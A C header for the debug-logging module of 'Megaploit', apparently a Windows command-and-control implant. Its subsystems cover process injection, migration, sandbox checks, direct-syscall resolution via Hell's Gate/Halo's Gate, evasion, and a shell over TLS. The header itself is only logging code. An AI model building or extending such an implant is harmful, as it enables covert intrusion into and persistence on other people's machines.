/*
 * client/debug/agent_debug.h  –  Megaploit C-agent runtime debugger
 * ==================================================================
 * A compile-time-optional, zero-overhead-in-release structured log
 * system for the entire agent lifecycle.
 *
 * How to enable
 * -------------
 * Pass -DAGENT_DEBUG to the compiler (or use the Makefile shorthand):
 *
 *   make C2_IP=... DBG=1
 *
 * All dbg_*() calls compile to nothing when AGENT_DEBUG is NOT defined,
 * so release builds are completely clean — no extra imports, no strings.
 *
 * Output destinations (both active simultaneously when debug is on)
 * ----------------------------------------------------------------
 *   1. Log file  %TEMP%\megaploit_agent_debug.log
 *      Opened once at dbg_init(), appended on every subsequent launch.
 *      Contains UTC timestamp, subsystem, severity, and message.
 *
 *   2. OutputDebugStringA
 *      Readable in real-time from a debugger (x64dbg, WinDbg, DbgView).
 *      Each line is prefixed with "[MAGENT] " for easy filter setup.
 *
 * Log format (one line per event)
 * --------------------------------
 *   [HH:MM:SS.mmm | SUBSYS | SEV] message
 *
 * Example
 * -------
 *   [12:34:56.789 | NTCALL | OK ] ntcalls_load() = 0xFF (all resolved)
 *   [12:34:56.791 | NTCALL | OK ] ntcalls_verify() = 0x00 (all OK)
 *   [12:34:56.800 | SCALL  | OK ] sc_init: SSN[NtAllocateVirtualMemory]=0x18 gadget=0x7FFE0308
 *   [12:34:56.805 | TLS    | ERR] tls_connect failed — socket error
 *
 * Severity codes
 * --------------
 *   DBG_OK   (0)  – success / informational
 *   DBG_WARN (1)  – non-fatal anomaly (partial resolve, privilege denied)
 *   DBG_ERR  (2)  – hard failure
 *   DBG_INFO (3)  – neutral state dump
 */

#pragma once
#ifndef AGENT_DEBUG_H
#define AGENT_DEBUG_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <stdarg.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ── Severity constants ─────────────────────────────────────────────────── */
#define DBG_OK    0
#define DBG_WARN  1
#define DBG_ERR   2
#define DBG_INFO  3

/* ── Subsystem name constants ────────────────────────────────────────────── */
#define DBG_SS_INIT     "INIT  "
#define DBG_SS_NTCALL   "NTCALL"
#define DBG_SS_SCALL    "SCALL "
#define DBG_SS_SPOOF    "SPOOF "
#define DBG_SS_INJECT   "INJECT"
#define DBG_SS_MIGRATE  "MIGRAT"
#define DBG_SS_SANDBOX  "SNDBOX"
#define DBG_SS_TLS      "TLS   "
#define DBG_SS_SHELL    "SHELL "
#define DBG_SS_EVASION  "EVASN "
#define DBG_SS_KEY      "KEY   "
#define DBG_SS_NET      "NET   "
#define DBG_SS_SOCK     "SOCK  "
#define DBG_SS_THREAD   "THREAD"

/* ── Public API (real implementations, compiled only when AGENT_DEBUG) ───── */

#ifdef AGENT_DEBUG

/*
 * dbg_init
 * --------
 * Must be called once at the very start of WinMain / AgentRun.
 * Opens (or appends to) the log file and writes a session header.
 * Safe to call multiple times — only the first call has any effect.
 */
void dbg_init(void);

/*
 * dbg_log
 * -------
 * Write one structured log line to the log file and OutputDebugStringA.
 *
 * Parameters
 *   subsys  – one of the DBG_SS_* string constants
 *   sev     – DBG_OK / DBG_WARN / DBG_ERR / DBG_INFO
 *   fmt     – printf-style format string
 *   ...     – format arguments
 */
void dbg_log(const char *subsys, int sev, const char *fmt, ...);

/*
 * dbg_hex
 * -------
 * Dump up to `max_bytes` bytes of `buf` as a hex string on one log line.
 * Useful for inspecting raw keys, shellcode headers, TLS frame prefixes, etc.
 */
void dbg_hex(const char *subsys, int sev, const char *label,
             const BYTE *buf, DWORD len, DWORD max_bytes);

/*
 * dbg_ntcalls
 * -----------
 * Log the return values of ntcalls_load() and ntcalls_verify() with a
 * detailed per-bit decode of what resolved / what failed.
 */
void dbg_ntcalls(DWORD load_rc, DWORD verify_rc);

/*
 * dbg_scall
 * ---------
 * Log all resolved syscall numbers and their ntdll gadget addresses.
 * Call after sc_init() to verify Hell's Gate / Halo's Gate resolution.
 */
void dbg_scall(void);

/*
 * dbg_process
 * -----------
 * Log identity of the current process: PID, image path, CWD, integrity level.
 */
void dbg_process(void);

/*
 * dbg_sandbox
 * -----------
 * Log the outcome of sandbox_check() with per-check detail:
 * hypervisor bit, RDTSC delta, RAM, CPU count, module scan result.
 */
void dbg_sandbox(BOOL sandbox_result);

/*
 * dbg_tls
 * -------
 * Log TLS connection attempt result and lastErr code with human-readable decode.
 */
void dbg_tls(BOOL connect_ok, int last_err);

/*
 * dbg_migrate
 * -----------
 * Log auto-migrate attempt: target PID, path, injection result.
 */
void dbg_migrate(DWORD target_pid, const char *target_path, BOOL ok);

/*
 * dbg_key
 * -------
 * Log secret key load result (never log the key bytes themselves).
 * Logs path, file size read, decode success, and first/last nibble only.
 */
void dbg_key(const char *path, BOOL ok);

/*
 * dbg_flush
 * ---------
 * Flush the log file to disk.  Called automatically after every dbg_log(),
 * but exposed for callers that batch many writes.
 */
void dbg_flush(void);

/*
 * dbg_close
 * ---------
 * Flush and close the log file.  Optional — the OS will close it on exit.
 */
void dbg_close(void);

/* ── Convenience macros (compile to nothing in release) ────────────────── */
#define DBG_INIT()                    dbg_init()
#define DBG_LOG(ss, sev, ...)         dbg_log((ss), (sev), __VA_ARGS__)
#define DBG_HEX(ss, sev, lbl, b, l, m) dbg_hex((ss),(sev),(lbl),(b),(l),(m))
#define DBG_NTCALLS(load, verify)     dbg_ntcalls((load), (verify))
#define DBG_SCALL()                   dbg_scall()
#define DBG_PROCESS()                 dbg_process()
#define DBG_SANDBOX(r)                dbg_sandbox(r)
#define DBG_TLS(ok, err)              dbg_tls((ok), (err))
#define DBG_MIGRATE(pid, path, ok)    dbg_migrate((pid), (path), (ok))
#define DBG_KEY(path, ok)             dbg_key((path), (ok))
#define DBG_FLUSH()                   dbg_flush()
#define DBG_CLOSE()                   dbg_close()

#else  /* AGENT_DEBUG not defined — everything is a no-op */

#define DBG_INIT()                    ((void)0)
#define DBG_LOG(ss, sev, ...)         ((void)0)
#define DBG_HEX(ss, sev, lbl, b, l, m) ((void)0)
#define DBG_NTCALLS(load, verify)     ((void)0)
#define DBG_SCALL()                   ((void)0)
#define DBG_PROCESS()                 ((void)0)
#define DBG_SANDBOX(r)                ((void)0)
#define DBG_TLS(ok, err)              ((void)0)
#define DBG_MIGRATE(pid, path, ok)    ((void)0)
#define DBG_KEY(path, ok)             ((void)0)
#define DBG_FLUSH()                   ((void)0)
#define DBG_CLOSE()                   ((void)0)

/* Stub declarations so the compiler sees valid prototypes even in release */
static inline void dbg_init(void)           {}
static inline void dbg_log(const char *s, int v, const char *f, ...) {(void)s;(void)v;(void)f;}
static inline void dbg_hex(const char *s, int v, const char *l,
                            const BYTE *b, DWORD n, DWORD m)
                   {(void)s;(void)v;(void)l;(void)b;(void)n;(void)m;}
static inline void dbg_ntcalls(DWORD a, DWORD b)  {(void)a;(void)b;}
static inline void dbg_scall(void)                 {}
static inline void dbg_process(void)               {}
static inline void dbg_sandbox(BOOL r)             {(void)r;}
static inline void dbg_tls(BOOL a, int b)          {(void)a;(void)b;}
static inline void dbg_migrate(DWORD p, const char *t, BOOL o) {(void)p;(void)t;(void)o;}
static inline void dbg_key(const char *p, BOOL o)  {(void)p;(void)o;}
static inline void dbg_flush(void)                 {}
static inline void dbg_close(void)                 {}

#endif /* AGENT_DEBUG */

#ifdef __cplusplus
}
#endif
#endif /* AGENT_DEBUG_H */
